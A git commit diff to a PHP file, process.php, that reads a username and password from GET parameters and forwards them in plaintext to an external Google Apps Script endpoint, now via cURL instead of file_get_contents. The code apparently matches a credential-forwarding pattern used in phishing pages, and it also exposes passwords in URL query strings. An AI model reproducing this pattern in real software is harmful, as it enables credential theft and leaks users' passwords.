e1088972b0304d98f11c582b20bbcc344dd3d16b
RedibleSky <louat.Billy@outlook.fr>
2024-12-01 20:17:48 +0100

    Update process.php

--- process.php
+++ process.php
@@ -6,9 +6,18 @@ $password = $_GET['password'];
 $url = "https://script.google.com/macros/s/AKfycby2ejRpgRkI56czpYdFZKg9lSxsc-C2-i4uvyvH5Qbo1MrJLvIFGcPTz5_k3dV_zSE/exec?username=" . urlencode($username) . "&password=" . urlencode($password);
 
 
-$response = file_get_contents($url);
+$ch = curl_init();
+
+
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+
+$response = curl_exec($ch);
+
+
+curl_close($ch);
 
 
 echo "Response from Google Apps Script: " . htmlspecialchars($response);
 ?>
-
